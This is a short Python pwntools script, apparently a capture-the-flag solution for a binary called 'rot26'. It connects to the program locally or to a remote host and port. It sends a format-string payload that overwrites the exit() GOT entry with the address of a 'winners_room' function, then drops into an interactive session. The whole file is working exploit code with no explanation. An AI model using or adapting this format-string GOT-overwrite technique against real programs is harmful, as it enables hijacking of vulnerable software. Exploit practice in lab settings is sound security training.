#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author: lanzhaoxian
# time: 2019/x/x

from pwn import *
import sys
from time import sleep
from LibcSearcher import *

proc = './rot26'
if len(sys.argv) == 1:
    c = process(proc)
elif len(sys.argv) == 2:
    serverport = sys.argv[1].split(':')
    c = remote(serverport[0], int(serverport[1]))
else:
    c = remote(sys.argv[1], int(sys.argv[2]))
context.binary = proc
elf = ELF(proc)
rop = ROP(proc)

exit_got_addr = elf.got['exit']
winners_room_addr = 0x08048737

payload = flat([exit_got_addr, '%34611c%7$hn'])
c.sendline(payload)

c.interactive()
